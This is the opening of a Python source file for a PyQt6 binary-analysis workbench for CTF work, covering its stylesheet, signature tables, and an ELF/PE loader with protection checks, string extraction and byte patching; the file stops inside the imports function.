#!/usr/bin/env python3
"""
Triage — Binary Analysis Workbench
===================================
PyQt6 rewrite with QDockWidget workspace, exROP engine, Triton symbolic
execution, CAPA capability detection, and openECSC-2024 auto-solvers.

Install core deps:
    pip install PySide6 pyelftools pefile capstone lief keystone-engine

Install enhanced deps:
    pip install qtawesome qt-material r2pipe pwntools angr z3-solver

Install optional deps:
    pip install triton-library   # symbolic execution
    pip install capa             # capability detection (pip install flare-capa)

Usage:
    python3 ctf_ultimate_v4.py [binary_path]
"""

import sys, os, re, math, json, hashlib, subprocess, io
import logging, traceback, textwrap
from collections import defaultdict, OrderedDict
from typing import Dict, List, Optional, Tuple

# ── Logging ──────────────────────────────────────────────────────────
logging.basicConfig(level=logging.WARNING,
                    format='%(asctime)s [%(levelname)s] %(name)s: %(message)s')
log = logging.getLogger('ctf_v4')

# ── Config persistence ────────────────────────────────────────────────
CONFIG_PATH = os.path.expanduser('~/.ctf_ultimate_v4.json')

def _load_config() -> dict:
    try:
        with open(CONFIG_PATH) as f: return json.load(f)
    except FileNotFoundError:
        return {}
    except json.JSONDecodeError:
        log.warning(f'Corrupt config at {CONFIG_PATH}, starting fresh')
        return {}

# ══════════════════════════════════════════════════════════════════════
# Qt imports — PySide6 primary, PyQt5 fallback
# ══════════════════════════════════════════════════════════════════════
from PyQt6.QtWidgets import (
    QApplication, QMainWindow, QWidget, QDockWidget, QTabWidget,
    QVBoxLayout, QHBoxLayout, QSplitter, QLabel, QPushButton, QLineEdit,
    QPlainTextEdit, QListWidget, QTreeWidget,
    QTreeWidgetItem, QTableWidget, QTableWidgetItem, QComboBox, QCheckBox,
    QFileDialog, QMessageBox, QInputDialog, QHeaderView, QMenu,
    QStatusBar, QProgressBar,
    QGraphicsView, QGraphicsScene, QGraphicsRectItem, QGraphicsTextItem,
    QGraphicsPathItem, QGraphicsPolygonItem, QGraphicsItem,
    QAbstractItemView, QDialog,
)
from PyQt6.QtCore import (
    Qt, pyqtSignal, QPointF, QTimer, QThread,
)
from PyQt6.QtGui import (
    QFont, QBrush, QColor, QPen, QPainter, QTextCharFormat,
    QSyntaxHighlighter, QPainterPath, QPolygonF, QLinearGradient,
    QAction,
)
Signal = pyqtSignal
PYSIDE6 = False  # using PyQt6
log.info('Using PyQt6')

# ── Optional deps ─────────────────────────────────────────────────────
try:
    from elftools.elf.elffile import ELFFile
    from elftools.elf.sections import SymbolTableSection
    HAS_PYELFTOOLS = True
except ImportError: HAS_PYELFTOOLS = False

try:
    import pefile; HAS_PEFILE = True
except ImportError: HAS_PEFILE = False

try:
    import lief; HAS_LIEF = True
except ImportError: HAS_LIEF = False

try:
    from capstone import Cs, CS_ARCH_X86, CS_ARCH_ARM, CS_ARCH_ARM64
    from capstone import CS_MODE_64, CS_MODE_32, CS_MODE_ARM
    HAS_CAPSTONE = True
except ImportError: HAS_CAPSTONE = False

try:
    import r2pipe; HAS_R2PIPE = True
except ImportError: HAS_R2PIPE = False

try:
    import keystone; HAS_KEYSTONE = True
except ImportError: HAS_KEYSTONE = False

try:
    import qtawesome as qta; HAS_QTA = True
except ImportError: HAS_QTA = False

try:
    import pwnlib.rop; HAS_PWNTOOLS = True
except ImportError: HAS_PWNTOOLS = False

try:
    import triton; HAS_TRITON = True
except ImportError: HAS_TRITON = False

try:
    import capa.main; HAS_CAPA = True
except ImportError: HAS_CAPA = False

try:
    import angr; HAS_ANGR = True
except ImportError: HAS_ANGR = False

try:
    import z3; HAS_Z3 = True
except ImportError: HAS_Z3 = False


# ══════════════════════════════════════════════════════════════════════
# Catppuccin Mocha Palette + QSS
# ══════════════════════════════════════════════════════════════════════
C = {
    'bg':'#2b2b2b','mantle':'#333333','crust':'#2b2b2b',
    'surface0':'#3c3c3c','surface1':'#454545','surface2':'#555555',
    'overlay0':'#888888','overlay1':'#999999','overlay2':'#aaaaaa',
    'text':'#e0e0e0','subtext1':'#cccccc','subtext0':'#aaaaaa',
    'red':'#ff6b68','maroon':'#ff6b68','orange':'#cc7832',
    'yellow':'#bbb529','green':'#6a8759','teal':'#6a8759',
    'sky':'#6897bb','blue':'#6897bb','lavender':'#9876aa',
    'mauve':'#9876aa','pink':'#cc7832','flamingo':'#cc7832',
}

QSS = f"""
/* ── Base ───────────────────────────────────────────────────────────── */
QMainWindow, QDialog {{
    background: {C['bg']};
    color: {C['text']};
}}
QWidget {{
    background: transparent;
    color: {C['text']};
    font-family: 'Segoe UI', 'Noto Sans', 'Ubuntu', sans-serif;
    font-size: 12px;
}}
QWidget:disabled {{ color: {C['overlay0']}; }}

/* ── Dock Panels (Ghidra-style: flat header, no rounding) ──────────── */
QDockWidget {{
    background: {C['mantle']};
    color: {C['text']};
    font-size: 11px;
    titlebar-close-icon: none;
    border: none;
}}
QDockWidget::title {{
    background: {C['surface0']};
    padding: 3px 8px;
    color: {C['subtext1']};
    font-size: 11px;
    font-weight: 600;
    border-bottom: 1px solid {C['surface1']};
}}
QDockWidget::float-button {{
    background: {C['surface1']};
    padding: 0px;
    border: 1px solid {C['surface2']};
}}

/* ── Tabs (flat, sharp) ─────────────────────────────────────────────── */
QTabWidget::pane {{
    border: 1px solid {C['surface1']};
    background: {C['bg']};
    top: -1px;
}}
QTabBar::tab {{
    background: {C['surface0']};
    color: {C['subtext0']};
    padding: 3px 10px;
    border: 1px solid {C['surface1']};
    border-bottom: none;
    margin-right: 1px;
    font-size: 11px;
    min-width: 50px;
}}
QTabBar::tab:selected {{
    background: {C['bg']};
    color: {C['blue']};
    font-weight: 600;
    border-bottom: 2px solid {C['blue']};
}}
QTabBar::tab:hover:!selected {{ background: {C['surface1']}; color: {C['text']}; }}

/* ── List / Tree / Table ────────────────────────────────────────────── */
QListWidget, QTreeWidget, QTableWidget, QTextEdit,
QLineEdit, QPlainTextEdit {{
    background: {C['mantle']};
    color: {C['text']};
    border: 1px solid #2a2a3a;
    selection-background-color: {C['surface1']};
    selection-color: {C['text']};
    font-family: 'JetBrains Mono', 'Cascadia Code', 'Consolas', monospace;
    font-size: 11px;
    outline: none;
}}
QTreeWidget::item, QListWidget::item, QTableWidget::item {{
    padding: 2px 4px;
    min-height: 20px;
    border: none;
}}
QTreeWidget::item:selected, QListWidget::item:selected,
QTableWidget::item:selected {{
    background: {C['surface1']};
    color: {C['text']};
    border: none;
    outline: none;
}}
QTreeWidget::item:hover, QListWidget::item:hover,
QTableWidget::item:hover {{
    background: {C['surface0']};
}}
QTreeWidget::item:selected:active, QListWidget::item:selected:active {{
    background: {C['surface1']};
    color: {C['text']};
}}
QHeaderView::section {{
    background: {C['surface0']};
    color: {C['subtext1']};
    padding: 2px 5px;
    border: none;
    border-right: 1px solid {C['surface1']};
    border-bottom: 1px solid {C['surface1']};
    font-weight: 600;
    font-size: 11px;
}}
QHeaderView {{
    background: {C['surface0']};
    border: none;
}}

/* ── Buttons (flat, sharp, minimal) ─────────────────────────────────── */
QPushButton {{
    background: {C['surface1']};
    color: {C['text']};
    border: 1px solid {C['surface2']};
    padding: 3px 10px;
    font-size: 11px;
    min-height: 20px;
}}
QPushButton:hover {{
    background: {C['overlay0']};
    border-color: {C['overlay1']};
}}
QPushButton:pressed {{
    background: {C['surface2']};
    border-color: {C['blue']};
}}
QPushButton:disabled {{
    background: {C['surface0']};
    color: {C['overlay0']};
    border-color: {C['surface1']};
}}
QPushButton#accent {{
    background: #6897bb;
    color: #ffffff;
    border-color: #6897bb;
}}
QPushButton#accent:hover {{
    background: #7ab0d4;
    border-color: #7ab0d4;
}}
QPushButton#accent:pressed {{
    background: #4a7aaa;
}}
QPushButton#danger {{
    background: {C['red']};
    color: #ffffff;
    border-color: {C['red']};
}}
QPushButton#danger:hover {{
    background: {C['maroon']};
    border-color: {C['maroon']};
}}

/* ── Toolbar (Ghidra: compact, transparent, subtle hover) ──────────── */
QToolBar {{
    background: {C['surface0']};
    border: none;
    border-bottom: 1px solid {C['surface1']};
    spacing: 1px;
    padding: 2px 4px;
}}
QToolBar::separator {{
    background: {C['surface2']};
    width: 1px;
    margin: 3px 4px;
}}
QToolBar QToolButton {{
    background: transparent;
    color: {C['text']};
    border: 1px solid transparent;
    padding: 2px 6px;
    font-size: 11px;
    border-radius: 0px;
}}
QToolBar QToolButton:hover {{
    background: {C['surface1']};
    border-color: {C['surface2']};
}}
QToolBar QToolButton:pressed {{
    background: {C['surface2']};
}}

/* ── Progress (flat, thin) ──────────────────────────────────────────── */
QProgressBar {{
    background: {C['mantle']};
    border: 1px solid {C['surface1']};
    text-align: center;
    color: {C['text']};
    font-size: 10px;
    height: 10px;
}}
QProgressBar::chunk {{
    background: {C['blue']};
}}

/* ── CheckBox ───────────────────────────────────────────────────────── */
QCheckBox {{ color: {C['text']}; font-size: 11px; spacing: 4px; }}
QCheckBox::indicator {{
    width: 13px; height: 13px;
    border: 1px solid {C['surface2']};
    background: {C['surface0']};
}}
QCheckBox::indicator:checked {{
    background: {C['blue']};
    border-color: {C['blue']};
}}
QCheckBox::indicator:hover {{
    border-color: {C['overlay1']};
}}

/* ── Labels ─────────────────────────────────────────────────────────── */
QLabel {{ color: {C['text']}; font-size: 12px; border: none; background: transparent; }}
QLabel#sectionHeader {{
    color: {C['pink']};
    font-weight: 600;
    font-size: 11px;
    padding: 2px 0;
    border-bottom: 1px solid {C['surface1']};
}}

/* ── Scrollbars (thin, flat) ────────────────────────────────────────── */
QScrollBar:vertical {{
    background: {C['mantle']};
    width: 7px;
    border: none;
    margin: 0;
}}
QScrollBar::handle:vertical {{
    background: {C['surface2']};
    min-height: 18px;
    border-radius: 0px;
}}
QScrollBar::handle:vertical:hover {{ background: {C['overlay1']}; }}
QScrollBar::add-line:vertical, QScrollBar::sub-line:vertical {{ height: 0; }}
QScrollBar:horizontal {{
    background: {C['mantle']};
    height: 7px;
    border: none;
    margin: 0;
}}
QScrollBar::handle:horizontal {{
    background: {C['surface2']};
    min-width: 18px;
    border-radius: 0px;
}}
QScrollBar::handle:horizontal:hover {{ background: {C['overlay1']}; }}
QScrollBar::add-line:horizontal, QScrollBar::sub-line:horizontal {{ width: 0; }}

/* ── Status Bar ─────────────────────────────────────────────────────── */
QStatusBar {{
    background: {C['surface0']};
    color: {C['subtext0']};
    border-top: 1px solid {C['surface1']};
    font-size: 11px;
    padding: 1px 4px;
}}
QStatusBar::item {{ border: none; }}

/* ── Graphics ───────────────────────────────────────────────────────── */
QGraphicsView {{
    background: {C['mantle']};
    border: 1px solid {C['surface1']};
}}

/* ── Menus ──────────────────────────────────────────────────────────── */
QMenuBar {{
    background: {C['surface0']};
    color: {C['text']};
    border-bottom: 1px solid {C['surface1']};
    font-size: 12px;
    padding: 0px;
}}
QMenuBar::item {{ padding: 3px 8px; }}
QMenuBar::item:selected {{ background: {C['surface1']}; color: {C['blue']}; }}
QMenu {{
    background: {C['surface0']};
    color: {C['text']};
    border: 1px solid {C['surface1']};
    padding: 2px;
    font-size: 12px;
}}
QMenu::item {{ padding: 3px 20px 3px 10px; }}
QMenu::item:selected {{ background: {C['surface1']}; color: {C['blue']}; }}
QMenu::separator {{ background: {C['surface1']}; height: 1px; margin: 2px 4px; }}

/* ── Tooltip ────────────────────────────────────────────────────────── */
QToolTip {{
    background: {C['surface1']};
    color: {C['text']};
    border: 1px solid {C['surface2']};
    padding: 3px 6px;
    font-size: 11px;
}}

/* ── Combo / Spin / Input ───────────────────────────────────────────── */
QComboBox {{
    background: {C['surface0']};
    color: {C['text']};
    border: 1px solid {C['surface1']};
    padding: 2px 5px;
    font-size: 11px;
    min-height: 20px;
}}
QComboBox:disabled {{ background: {C['mantle']}; color: {C['overlay0']}; }}
QComboBox::drop-down {{
    background: {C['surface1']};
    border: none;
    width: 16px;
}}
QComboBox QAbstractItemView {{
    background: {C['surface0']};
    color: {C['text']};
    selection-background-color: {C['surface1']};
    border: 1px solid {C['surface1']};
    outline: none;
}}
QSpinBox {{
    background: {C['surface0']};
    color: {C['text']};
    border: 1px solid {C['surface1']};
    padding: 2px 4px;
    font-size: 11px;
    min-height: 20px;
}}
QLineEdit {{
    padding: 2px 5px;
    font-family: inherit;
    font-size: 12px;
    border: 1px solid {C['surface1']};
}}
QTextEdit, QPlainTextEdit {{
    padding: 3px;
    font-family: 'JetBrains Mono', 'Cascadia Code', 'Consolas', monospace;
    font-size: 11px;
}}

/* ── Splitters ──────────────────────────────────────────────────────── */
QMainWindow::separator {{
    width: 1px; height: 1px;
    background: {C['surface1']};
}}

/* ── GroupBox ───────────────────────────────────────────────────────── */
QGroupBox {{
    font-size: 11px;
    font-weight: 600;
    color: {C['subtext1']};
    border: 1px solid {C['surface1']};
    margin-top: 8px;
    padding: 8px 4px 4px 4px;
}}
QGroupBox::title {{
    subcontrol-origin: margin;
    padding: 0 6px;
    color: {C['blue']};
}}
"""

# ── Mnemonic colour map ────────────────────────────────────────────────
MNEMONIC_COLOR_MAP: Dict[str, str] = {}
for _color, _mnems in [
    (C['blue'],    'mov movs movsx movzx movabs lea push pop xchg cbw cwde cdqe'.split()),
    (C['green'],   'add sub mul imul div idiv inc dec neg adc sbb adcx adox'.split()),
    (C['teal'],    'and or xor not shl shr sar sal rol ror rcl rcr bt bts btr test cmp andn'.split()),
    (C['red'],     'jmp je jne jz jnz jg jge jl jle ja jae jb jbe js jns jo jno jp loop'.split()),
    (C['yellow'],  'call callq syscall sysenter int int3'.split()),
    (C['mauve'],   'ret retq retn retf leave enter iret hlt'.split()),
    (C['overlay0'],'nop endbr64 endbr32 ud2 pause lfence mfence sfence cpuid rdtsc'.split()),
    (C['orange'],  'rep repe repz repne scas stos lods cmps movs stosb stosw stosd stosq'.split()),
    (C['sky'],     'movss movsd xorps xorpd pxor paddb paddq pcmpeqb pshufd pslld'.split()),
]:
    for _m in _mnems: MNEMONIC_COLOR_MAP[_m] = _color

X86_REGISTERS = {
    'rax','rbx','rcx','rdx','rsi','rdi','rsp','rbp','rip',
    'r8','r9','r10','r11','r12','r13','r14','r15',
    'eax','ebx','ecx','edx','esi','edi','esp','ebp','eip',
    'r8d','r9d','r10d','r11d','r12d','r13d','r14d','r15d',
    'ax','bx','cx','dx','si','di','al','bl','cl','dl',
    'xmm0','xmm1','xmm2','xmm3','xmm4','xmm5','xmm6','xmm7',
    'ymm0','ymm1','ymm2','ymm3','ymm4','ymm5','ymm6','ymm7',
}
SYS_ARGS = ['rdi','rsi','rdx','rcx','r8','r9']

CRYPTO_SIGNATURES = {
    'AES S-box':   bytes([0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5]),
    'AES inv S-box': bytes([0x52,0x09,0x6a,0xd5,0x30,0x36,0xa5,0x38]),
    'SHA-256 K0':  bytes([0x98,0x2f,0x8a,0x42]),
    'MD5 magic':   bytes([0x01,0x23,0x45,0x67,0x89,0xab,0xcd,0xef]),
    'RC4 KSA':     b'KSA',
    'zlib':        bytes([0x78,0x9c]),
    'gzip':        bytes([0x1f,0x8b]),
    'bzip2':       bytes([0x42,0x5a,0x68]),
}

STRING_SIGS = {
    'PyInstaller': ['_MEIPASS','pyi-','PKG-0000'],
    'Golang':      ['runtime.main','go.buildid'],
    'UPX':         ['UPX!','This file is packed with the UPX executable packer'],
    '.NET':        ['mscoree.dll','_CorExeMain'],
    'Nim':         ['NimMain','nim_program_result'],
    'Rust':        ['rust_begin_unwind','__rust_alloc'],
}

# ══════════════════════════════════════════════════════════════════════
# Helper: icon factory
# ══════════════════════════════════════════════════════════════════════
_QTA_MAP = {
    'open':       ('fa5s.folder-open',  '\u2022 Open'),
    'close':      ('fa5s.times',        '\u2716 Close'),
    'save':       ('fa5s.save',         '\u2713 Save'),
    'search':     ('fa5s.search',       '\u2315 Search'),
    'run':        ('fa5s.play',         '\u25B6 Run'),
    'cancel':     ('fa5s.stop',         '\u25A0 Cancel'),
    'scan':       ('fa5s.binoculars',   '\u25CE Scan'),
    'copy':       ('fa5s.copy',         '\u2398 Copy'),
    'disasm':     ('fa5s.microchip',    '\u2261 Disasm'),
    'cfg':        ('fa5s.project-diagram', '\u25C7 CFG'),
    'decomp':     ('fa5s.code',         '\u2328 Decomp'),
    'rop':        ('fa5s.link',         '\u26D3 ROP'),
    'hex':        ('fa5s.table',        '\u25A6 Hex'),
    'strings':    ('fa5s.font',         '\u201C Strings'),
    'info':       ('fa5s.info-circle',  '\u24D8 Info'),
    'warn':       ('fa5s.exclamation-triangle', '\u26A0 Warn'),
    'bookmark':   ('fa5s.bookmark',     '\u2605 Bookmark'),
    'xref':       ('fa5s.exchange-alt', '\u21C4 XRef'),
    'gen':        ('fa5s.magic',        '\u2665 Generate'),
    'solve':      ('fa5s.robot',        '\u2771 Solve'),
    'fit':        ('fa5s.compress-arrows-alt', '\u25A3 Fit'),
    'horizontal': ('fa5s.arrows-alt-h', '\u2194 H-Layout'),
    'undo':       ('fa5s.undo',         '\u21BA Undo'),
    'redo':       ('fa5s.redo',         '\u21BB Redo'),
    'export':     ('fa5s.file-export',  '\u2B06 Export'),
    'import':     ('fa5s.file-import',  '\u2B07 Import'),
    'jump':       ('fa5s.crosshairs',   '\u2316 Jump'),
    'build':      ('fa5s.hammer',       '\u2692 Build'),
    'capa':       ('fa5s.fingerprint',  '\u2B57 CAPA'),
    'vuln':       ('fa5s.bug',          '\u2623 Vuln'),
    'angr':       ('fa5s.spider',       '\u2771 angr'),
    'z3':         ('fa5s.puzzle-piece', '\u25C6 Z3'),
    'shell':      ('fa5s.terminal',     '\u25B6 Shell'),
    'patch':      ('fa5s.band-aid',     '\u2702 Patch'),
    'chain':      ('fa5s.link',         '\u26D3 Chain'),
}

def _icon(key: str):
    from PyQt6.QtGui import QIcon
    if HAS_QTA:
        qta_name, _ = _QTA_MAP.get(key, ('fa5s.circle', ''))
        try:
            return qta.icon(qta_name, color=C['text'])
        except Exception:
            log.debug(f'qtawesome icon {qta_name} not found')
    return QIcon()

def _btn(key: str, label: str = '', parent=None) -> 'QPushButton':
    from PyQt6.QtWidgets import QPushButton as _B
    _, sym = _QTA_MAP.get(key, ('', label or key))
    txt = label if label else sym
    b = _B(txt, parent) if parent else _B(txt)
    ico = _icon(key)
    if not ico.isNull():
        b.setIcon(ico)
        b.setText(label if label else '')
    return b


# ══════════════════════════════════════════════════════════════════════
# Worker — generic off-thread runner
# ══════════════════════════════════════════════════════════════════════
class Worker(QThread):
    result   = Signal(object)
    error    = Signal(str)
    progress = Signal(int, str)

    def __init__(self, fn, *args, **kwargs):
        super().__init__()
        self._fn = fn
        self._args = args
        self._kwargs = kwargs

    def run(self):
        try:
            r = self._fn(*self._args, **self._kwargs)
            self.result.emit(r)
        except Exception as e:
            self.error.emit(f'{type(e).__name__}: {e}\n{traceback.format_exc()}')


# ══════════════════════════════════════════════════════════════════════
# Data structures
# ══════════════════════════════════════════════════════════════════════
class BasicBlock:
    def __init__(self, addr: int):
        self.addr = addr
        self.instructions: List[dict] = []
        self.successors: List[Tuple[int, str]] = []
        self.predecessors: List[Tuple[int, str]] = []
        self.x = self.y = 0.0
        self.width = 320.0
        self.height = 80.0


class CommentsDB:
    def __init__(self):
        self.comments: Dict[int, str] = {}
    def set(self, addr, text):
        if text: self.comments[addr] = text
        elif addr in self.comments: del self.comments[addr]
    def get(self, addr): return self.comments.get(addr, '')
    def to_dict(self): return {hex(k): v for k, v in self.comments.items()}
    def from_dict(self, d):
        self.comments = {}
        for k, v in d.items():
            try: self.comments[int(k, 16)] = v
            except Exception as _e: log.debug(f"Suppressed: {_e}")


class BookmarksDB:
    DEFAULT_GROUP = 'General'
    def __init__(self):
        self.bookmarks: List[Tuple[int, str, str]] = []
    def add(self, addr, label='', group=''):
        group = group.strip() or self.DEFAULT_GROUP
        if not any(a == addr for a,_,_ in self.bookmarks):
            self.bookmarks.append((addr, label or hex(addr), group))
    def remove(self, addr):
        self.bookmarks = [(a,l,g) for a,l,g in self.bookmarks if a != addr]
    def by_group(self) -> Dict[str, List[Tuple[int, str]]]:
        d: Dict[str, List[Tuple[int, str]]] = defaultdict(list)
        for addr, label, group in self.bookmarks: d[group].append((addr, label))
        return dict(d)
    def to_list(self): return [[hex(a),l,g] for a,l,g in self.bookmarks]
    def from_list(self, lst):
        self.bookmarks = []
        for item in lst:
            try:
                self.bookmarks.append((int(item[0],16), item[1] if len(item)>1 else '', item[2] if len(item)>2 else self.DEFAULT_GROUP))
            except Exception as _e: log.debug(f"Suppressed: {_e}")


class XRefDB:
    def __init__(self):
        self.xrefs_to:   Dict[int, List[Tuple[int,str]]] = defaultdict(list)
        self.xrefs_from: Dict[int, List[Tuple[int,str]]] = defaultdict(list)
    def add(self, frm, to, typ='call'):
        if (frm, typ) not in self.xrefs_to[to]:
            self.xrefs_to[to].append((frm, typ))
        if (to, typ) not in self.xrefs_from[frm]:
            self.xrefs_from[frm].append((to, typ))
    def build_from_insns(self, insns):
        for insn in insns:
            mn = insn['mnemonic'].lower()
            if mn in ('call','callq') or mn.startswith('j'):
                try:
                    t = int(insn['op_str'].strip(), 16)
                    self.add(insn['address'], t, 'call' if 'call' in mn else 'jump')
                except Exception as _e: log.debug(f"Suppressed: {_e}")


# ══════════════════════════════════════════════════════════════════════
# BinaryLoader
# ══════════════════════════════════════════════════════════════════════
class BinaryLoader:
    FMT_ELF = 'ELF'; FMT_PE = 'PE'

    def __init__(self, path: str):
        self.path = os.path.abspath(path)
        self.fmt = 'Unknown'; self.arch = 'x86_64'; self.bits = 64
        self.entry_point = 0
        self.file_size = os.path.getsize(path)
        self._raw = bytearray()
        self._elf = self._elf_fh = self._pe = self._lief_bin = None
        with open(path,'rb') as f: self._raw = bytearray(f.read())
        self.user_names: Dict[int,str] = {}
        self._insn_cache: Dict[Tuple,List[dict]] = {}
        self._cfg_cache: Dict[int,Dict[int,BasicBlock]] = {}
        self._patch_stack: List[Tuple] = []
        self._redo_stack: List[Tuple] = []
        self._patches: List[Tuple] = []
        self._clear_caches()
        self._detect_format()
        self._load()

    def _clear_caches(self):
        self._vaddr_to_offset_cache: Dict[int, int] = {}
        self._info_cache = None
        self._entropy_cache = None
        self._text_cache = None
        self._hash_cache = None
        self._func_cache = None
        self._section_cache = None
        self._segment_cache = None
        self._import_cache = None
        self._export_cache = None
        self._symbol_cache = None
        self._protections_cache = None
        self._detect_packer_cache = None
        self._strings_cache = None
        self._crypto_cache = None
        self._vaddr_to_offset_cache.clear()

    def _detect_format(self):
        if self._raw[:4] == b'\x7fELF': self.fmt = self.FMT_ELF
        elif self._raw[:2] == b'MZ': self.fmt = self.FMT_PE

    def _load(self):
        if HAS_LIEF:
            try: self._lief_bin = lief.parse(self.path)
            except Exception as _e: log.debug(f"Suppressed: {_e}")
        if self.fmt == self.FMT_ELF and HAS_PYELFTOOLS:
            self._elf_fh = open(self.path,'rb')
            self._elf = ELFFile(self._elf_fh)
            self.entry_point = self._elf.header['e_entry']
            ei = self._elf.header['e_ident']['EI_CLASS']
            self.bits = 64 if ei == 'ELFCLASS64' else 32
            self.arch = {'EM_X86_64':'x86_64','EM_386':'x86','EM_ARM':'ARM','EM_AARCH64':'AArch64'}.get(self._elf.header['e_machine'],'x86_64')
        elif self.fmt == self.FMT_PE and HAS_PEFILE:
            self._pe = pefile.PE(self.path)
            self.entry_point = self._pe.OPTIONAL_HEADER.AddressOfEntryPoint + self._pe.OPTIONAL_HEADER.ImageBase
            self.bits = 64 if self._pe.OPTIONAL_HEADER.Magic == 0x20b else 32
            self.arch = 'x86_64' if self.bits == 64 else 'x86'

    def close(self):
        self._clear_caches()
        if self._elf_fh: self._elf_fh.close()

    def session_path(self) -> str:
        base, _ = os.path.splitext(self.path)
        return f'{base}.ctf.json'

    def load_session(self, comments: CommentsDB, bookmarks: BookmarksDB) -> dict:
        """Returns session dict (may include rop_gadgets, capa_summary)."""
        try:
            with open(self.session_path()) as f: data = json.load(f)
            comments.from_dict(data.get('comments', {}))
            bookmarks.from_list(data.get('bookmarks', []))
            self.user_names = {int(k): v for k, v in data.get('user_names', {}).items()}
            for o, old, new in data.get('patches', []): self.apply_patch(o, bytes(new), persist=False)
            return data
        except (FileNotFoundError, json.JSONDecodeError):
            return {}

    def apply_patch(self, offset: int, new_bytes: bytes, persist=True):
        old = bytes(self._raw[offset:offset+len(new_bytes)])
        self._raw[offset:offset+len(new_bytes)] = new_bytes
        if persist:
            self._patches.append((offset, old, new_bytes))
            self._patch_stack.append((offset, old, new_bytes))
            self._redo_stack.clear()
        self._insn_cache.clear(); self._cfg_cache.clear(); self._clear_caches()

    def patch_at_vaddr(self, vaddr: int, new_bytes: bytes) -> bool:
        off = self.vaddr_to_offset(vaddr)
        if off < 0: return False
        self.apply_patch(off, new_bytes)
        return True

    def undo_patch(self):
        if not self._patch_stack: return None
        off, old, new = self._patch_stack.pop()
        self._raw[off:off+len(old)] = old
        self._redo_stack.append((off, old, new))
        self._insn_cache.clear(); self._cfg_cache.clear(); self._clear_caches()
        return (off, old, new)

    def redo_patch(self):
        if not self._redo_stack: return None
        off, old, new = self._redo_stack.pop()
        self._raw[off:off+len(new)] = new
        self._patch_stack.append((off, old, new))
        self._insn_cache.clear(); self._cfg_cache.clear(); self._clear_caches()
        return (off, old, new)

    def save_patched(self, out: str):
        with open(out,'wb') as f: f.write(bytes(self._raw))

    def hashes(self):
        if self._hash_cache is not None:
            return self._hash_cache
        self._hash_cache = {'MD5':hashlib.md5(self._raw).hexdigest(),
                            'SHA1':hashlib.sha1(self._raw).hexdigest(),
                            'SHA256':hashlib.sha256(self._raw).hexdigest()}
        return self._hash_cache

    def rename_function(self, addr, name):
        if name: self.user_names[addr] = name
        else: self.user_names.pop(addr, None)
        self._insn_cache.clear()

    def protections(self) -> OrderedDict:
        if self._protections_cache is not None:
            return self._protections_cache
        flags = OrderedDict([
            ('NX (No-Execute)','Unknown'),('PIE (ASLR)','Unknown'),
            ('RELRO','None'),('Stack Canary','Unknown'),
            ('Fortify Source','Unknown'),('RWX Segments','No'),
        ])
        if self.fmt == self.FMT_ELF and self._elf:
            has_relro = has_bind_now = False
            canary = {'__stack_chk_fail','__stack_chk_guard'}
            fortify = {'__printf_chk','__memcpy_chk'}
            for seg in self._elf.iter_segments():
                pt, pf = seg['p_type'], seg['p_flags']
                if pt == 'PT_GNU_STACK':
                    flags['NX (No-Execute)'] = 'Disabled' if (pf&1) else 'Enabled'
                if pt == 'PT_GNU_RELRO': has_relro = True
                if pt == 'PT_LOAD' and (pf&7)==7: flags['RWX Segments'] = 'YES — shellcode possible'
            flags['PIE (ASLR)'] = 'Enabled' if self._elf.header['e_type']=='ET_DYN' else 'Disabled'
            for sec in self._elf.iter_sections():
                if hasattr(sec,'iter_tags'):
                    for tag in sec.iter_tags():
                        if tag.entry.d_tag == 'DT_BIND_NOW': has_bind_now = True
                if isinstance(sec, SymbolTableSection):
                    for sym in sec.iter_symbols():
                        sn = sym.name
                        if sn in canary: flags['Stack Canary'] = 'Enabled'
                        if sn in fortify: flags['Fortify Source'] = 'Enabled'
            if has_relro:
                flags['RELRO'] = 'Full' if has_bind_now else 'Partial'
        elif self.fmt == self.FMT_PE and self._pe:
            dc = self._pe.OPTIONAL_HEADER.DllCharacteristics
            flags['NX (No-Execute)'] = 'Enabled' if dc & 0x0100 else 'Disabled'
            flags['PIE (ASLR)'] = 'Enabled' if dc & 0x0040 else 'Disabled'
        for k in ('Stack Canary','Fortify Source'):
            if flags[k] == 'Unknown': flags[k] = 'Disabled'
        self._protections_cache = flags
        return self._protections_cache

    def get_strings(self, min_len=4) -> List[str]:
        if self._strings_cache is not None and min_len == 4:
            return self._strings_cache
        try:
            r = subprocess.run(['strings','-n',str(min_len),self.path],
                               capture_output=True,text=True,timeout=30)
            if r.returncode == 0: return r.stdout.splitlines()
        except Exception as _e: log.debug(f"Suppressed: {_e}")
        strings = [m.group() for m in re.finditer(rb'[\x20-\x7e]{' + str(min_len).encode() + rb',}', bytes(self._raw))]
        strings = [s.decode('ascii') for s in strings]
        if min_len == 4:
            self._strings_cache = strings
        return strings

    def get_sections(self) -> List[dict]:
        if self._section_cache is not None:
            return self._section_cache
        secs = []
        if self.fmt == self.FMT_ELF and self._elf:
            for s in self._elf.iter_sections():
                secs.append({'name':s.name or '(null)','vaddr':s['sh_addr'],'size':s['sh_size'],
                              'flags':s['sh_flags'],'type':s['sh_type'],'offset':s['sh_offset']})
        elif self.fmt == self.FMT_PE and self._pe:
            base = self._pe.OPTIONAL_HEADER.ImageBase
            for s in self._pe.sections:
                secs.append({'name':s.Name.decode(errors='replace').rstrip('\x00'),
                              'vaddr':s.VirtualAddress+base,'size':s.Misc_VirtualSize,
                              'flags':s.Characteristics,'type':'','offset':s.PointerToRawData})
        self._section_cache = secs
        return secs

    # ELF segment p_type integer → human-readable name
    _PT_NAMES: Dict[int, str] = {
        0:'PT_NULL', 1:'PT_LOAD', 2:'PT_DYNAMIC', 3:'PT_INTERP', 4:'PT_NOTE',
        5:'PT_SHLIB', 6:'PT_PHDR', 7:'PT_TLS',
        0x6474e550:'PT_GNU_EH_FRAME', 0x6474e551:'PT_GNU_STACK',
        0x6474e552:'PT_GNU_RELRO',    0x6474e553:'PT_GNU_PROPERTY',
    }

    def get_segments(self) -> List[dict]:
        if self._segment_cache is not None:
            return self._segment_cache
        segs = []
        if self.fmt == self.FMT_ELF and self._elf:
            for seg in self._elf.iter_segments():
                pf = seg['p_flags']
                perm = ('R' if pf&4 else '-')+('W' if pf&2 else '-')+('X' if pf&1 else '-')
                pt = seg['p_type']
                # pyelftools may return string or int depending on version
                pt_name = self._PT_NAMES.get(pt, f'PT_0x{pt:x}') if isinstance(pt, int) else str(pt)
                segs.append({'type': pt_name, 'vaddr': seg['p_vaddr'],
                              'memsz': seg['p_memsz'], 'filesz': seg['p_filesz'], 'flags': perm})
        self._segment_cache = segs
        return segs

    def get_imports(self) -> List[dict]:
